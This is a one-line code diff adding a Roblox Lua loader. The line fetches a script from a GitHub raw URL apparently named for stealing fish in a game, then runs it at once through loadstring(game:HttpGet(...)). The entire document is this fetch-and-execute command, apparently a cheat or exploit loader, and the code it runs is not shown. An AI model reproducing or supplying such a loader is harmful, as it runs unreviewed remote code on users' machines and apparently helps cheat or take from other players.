@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/erick-userscripts/ROUBE-DE-PEIXES-script-v5/refs/heads/main/scriptv2.lua"))()
